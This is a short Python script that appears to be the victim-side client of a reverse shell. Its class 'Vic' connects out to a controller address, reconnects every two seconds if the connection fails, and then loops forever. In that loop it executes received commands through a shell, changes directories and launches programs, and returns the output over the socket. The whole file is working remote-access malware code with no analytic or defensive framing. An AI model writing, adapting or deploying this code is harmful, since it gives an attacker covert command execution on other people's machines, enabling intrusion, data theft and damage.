#!/usr/bin/python3
import os
import subprocess
import socket
import time

class Vic():
    def __init__(self,ip,port):
        self.ip = ip
        self.port = port
        self.__connect__()
        self.__main__()

    def __connect__(self):
        self.s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        self.s.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)

        try:    
            self.s.connect((self.ip,self.port))
        
        except Exception as e:
            time.sleep(2)
            self.__connect__()

    def __main__(self):
        
        while(1):
            cmd = self.s.recv(100).decode()
            if(cmd[:2] == "cd"):
                try:
                    os.chdir(cmd[3:])
                    self.s.send(b"[+]Directory Changed.")
                
                except Exception as e:
                    data = str(e).encode()
                    self.s.send(data)

            elif (cmd == "quit!"):
                    self.s.close()
                    exit(0)

            elif (cmd[:3] == "run"):
                try:
                    prog = subprocess.Popen([cmd[4:]])
                    data = f"[+]Executed On {prog.pid}"
                    self.s.send(data.encode())
                except:
                    self.s.send(b"[-]Error.")

            else:
                    execute = subprocess.Popen(cmd,shell=True,stdout=subprocess.PIPE,stderr=subprocess.PIPE,stdin=subprocess.PIPE)
                    data = execute.stdout.read() + execute.stderr.read()
                    if(len(data) == 0 ):
                           self.s.send(b"[+]Executed.")
                    
                    else:
                           self.s.send(data)
                
                           


Vic("0.0.0.0",8888)
